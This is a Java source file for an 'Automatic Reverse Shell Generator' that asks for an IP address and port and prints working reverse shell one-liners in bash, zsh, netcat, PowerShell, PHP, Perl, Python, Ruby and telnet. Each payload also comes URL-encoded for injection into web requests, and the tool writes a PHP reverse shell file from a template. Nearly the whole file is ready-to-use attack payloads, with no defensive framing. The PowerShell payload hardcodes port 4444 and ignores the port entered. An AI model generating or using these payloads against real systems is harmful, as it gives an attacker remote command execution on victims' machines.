import java.io.*;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) throws UnsupportedEncodingException {

        System.out.println("\n" +
                " _    _               _____ _          _ _ \n" +
                "| |  | |             /  ___| |        | | |\n" +
                "| |  | | __ _ _   _  \\ `--.| |__   ___| | |\n" +
                "| |/\\| |/ _` | | | |  `--. \\ '_ \\ / _ \\ | |\n" +
                "\\  /\\  / (_| | |_| | /\\__/ / | | |  __/ | |\n" +
                " \\/  \\/ \\__,_|\\__, | \\____/|_| |_|\\___|_|_|\n" +
                "               __/ |                       \n" +
                "              |___/                        \n" +
                "");
        System.out.println("\u001B[32m" + "Automatic Reverse Shell Generator v1.0" + "\u001B[0m");

        System.out.println("\n");

        System.out.print("\u001B[31m" + "IP :" + "\u001B[0m");
        Scanner ip = new Scanner(System.in);
        String ip_address = ip.nextLine();
        System.out.print("\u001B[31m" + "PORT :" + "\u001B[0m");
        Scanner port = new Scanner(System.in);
        int p = port.nextInt();

        System.out.println("\n");
        System.out.println("1.BASH\n" +
                "2.Zsh\n" +
                "3.Netcat\n" +
                "4.PowerShell\n" +
                "5.PHP\n" +
                "6.PERL\n" +
                "7.Python\n" +
                "8.Ruby\n" +
                "9.Telnet\n" +
                "10.Reverse Shell Php");
        System.out.println("\n");
        System.out.println("\u001B[31m" + "Select LANG :" + "\u001B[0m");
        Scanner shell = new Scanner(System.in);
        int s = shell.nextInt();

        switch (s) {
            case 1:
                System.out.println("\u001B[31m" + "BASH :" + "\u001B[0m");
                System.out.println("bash -c 'exec bash -i &>/dev/tcp/" + ip_address + "/" + p + " <&1'");
                String payload_bash = "bash -c 'exec bash -i &>/dev/tcp/" + ip_address + "/" + p + " <&1'";
                String encodeURL = java.net.URLEncoder.encode(payload_bash, "UTF-8");
                System.out.println("\u001B[31m" + encodeURL + "\u001B[0m");
                System.out.println("\u001B[32m" + "Success!" + "\u001B[0m");
                break;

            case 2:
                System.out.println("\u001B[31m" + "ZSH :" + "\u001B[0m");
                System.out.println("zsh -c 'zmodload zsh/net/tcp && ztcp " + ip_address + " " + p + " && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'");
                String payload_zsh = "zsh -c 'zmodload zsh/net/tcp && ztcp " + ip_address + " " + p + " && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'";
                String encodeURL2 = java.net.URLEncoder.encode(payload_zsh, "UTF-8");
                System.out.println("\u001B[31m" + encodeURL2 + "\u001B[0m");
                System.out.println("\u001B[32m" + "Success!" + "\u001B[0m");
                break;

            case 3:
                System.out.println("\u001B[31m" + "NETCAT :" + "\u001B[0m");
                System.out.println("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip_address + " " + p + " >/tmp/f");
                String payload_netcat = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip_address + " " + p + " >/tmp/f";
                String encodeURL3 = java.net.URLEncoder.encode(payload_netcat, "UTF-8");
                System.out.println("\u001B[31m" + encodeURL3 + "\u001B[0m");
                System.out.println("\u001B[32m" + "Success!" + "\u001B[0m");
                break;

            case 4:
                System.out.println("\u001B[31m" + "POWERSHELL :" + "\u001B[0m");
                System.out.println("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('"
                        + ip_address + "',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) " +
                        "-ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = " +
                        "(iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);" +
                        "$stream.Flush()};$client.Close()\"");
                String payload_powershell = "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('"
                        + ip_address + "',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) " +
                        "-ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = " +
                        "(iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);" +
                        "$stream.Flush()};$client.Close()\"";
                String encodeURL4 = java.net.URLEncoder.encode(payload_powershell, "UTF-8");
                System.out.println("\u001B[31m" + encodeURL4 + "\u001B[0m");
                System.out.println("\u001B[32m" + "Success!" + "\u001B[0m");
                break;

            case 5:
                System.out.println("\u001B[31m" + "PHP :" + "\u001B[0m");
                System.out.println("php -r '$sock=fsockopen(" + ip_address + "," + p + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'");
                String payload_php = "php -r '$sock=fsockopen(" + ip_address + "," + p + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
                String encodeURL5 = java.net.URLEncoder.encode(payload_php, "UTF-8");
                System.out.println("\u001B[31m" + encodeURL5 + "\u001B[0m");
                System.out.println("\u001B[32m" + "Success!" + "\u001B[0m");
                break;

            case 6:
                System.out.println("\u001B[31m" + "PERL :" + "\u001B[0m");
                System.out.println("perl -e 'use Socket;$i=\"" + ip_address + "\";$p=" + p + ";socket(S,PF_INET,SOCK_STREAM," +
                        "getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");" +
                        "open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'");
                String payload_perl = "perl -e 'use Socket;$i=\"" + ip_address + "\";$p=" + p + ";socket(S,PF_INET,SOCK_STREAM," +
                        "getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");" +
                        "open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
                String encodeURL6 = java.net.URLEncoder.encode(payload_perl, "UTF-8");
                System.out.println("\u001B[31m" + encodeURL6 + "\u001B[0m");
                System.out.println("\u001B[32m" + "Success!" + "\u001B[0m");
                break;

            case 7:
                System.out.println("\u001B[31m" + "PYTHON :" + "\u001B[0m");
                System.out.println("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip_address + "\"," + p + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'");
                String payload_python = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip_address + "\"," + p + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
                String encodeURL7 = java.net.URLEncoder.encode(payload_python, "UTF-8");
                System.out.println("\u001B[31m" + encodeURL7 + "\u001B[0m");
                System.out.println("\u001B[32m" + "Success!" + "\u001B[0m");
                break;

            case 8:
                System.out.println("\u001B[31m" + "RUBY :" + "\u001B[0m");
                System.out.println("ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + ip_address + "\"," + p + ");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'");
                String payload_ruby = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + ip_address + "\"," + p + ");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'";
                String encodeURL8 = java.net.URLEncoder.encode(payload_ruby, "UTF-8");
                System.out.println("\u001B[31m" + encodeURL8 + "\u001B[0m");
                System.out.println("\u001B[32m" + "Success!" + "\u001B[0m");
                break;

            case 9:
                System.out.println("\u001B[31m" + "TELNET :" + "\u001B[0m");
                System.out.println("TF=$(mktemp -u); mkfifo $TF && telnet " + ip_address + " " + p + " 0<$TF | /bin/sh 1>$TF");
                String payload_telnet = "TF=$(mktemp -u); mkfifo $TF && telnet " + ip_address + " " + p + " 0<$TF | /bin/sh 1>$TF";
                String encodeURL9 = java.net.URLEncoder.encode(payload_telnet, "UTF-8");
                System.out.println("\u001B[31m" + encodeURL9 + "\u001B[0m");
                System.out.println("\u001B[32m" + "Success!" + "\u001B[0m");

                break;
            case 10:
                System.out.println("\u001B[31m" + "PHP :" + "\u001B[0m");
                reverseShell(ip_address, p);
                System.out.println("\u001B[32m" + "Success!" + "\u001B[0m");
                break;

            default:
        }
    }

    public static void reverseShell(String ip_address, int p) {
        String reverseShell = "";
        try {
            BufferedReader br = new BufferedReader(new FileReader("reverseShell.php"));
            String line;
            while ((line = br.readLine()) != null) {
                reverseShell += line + "\n";
            }
            br.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        reverseShell = reverseShell.replace("ip_adress",'"' + ip_address + '"');
        reverseShell = reverseShell.replace("port_number", String.valueOf(p));

        try {
            BufferedWriter bw = new BufferedWriter(new FileWriter("reverseShellNew.php"));
            bw.write(reverseShell);
            bw.close();
        } catch (IOException e) {
            e.printStackTrace();
            System.out.println("\u001B[31m" + "File Not Found!" + "\u001B[0m");
        }
    }
}
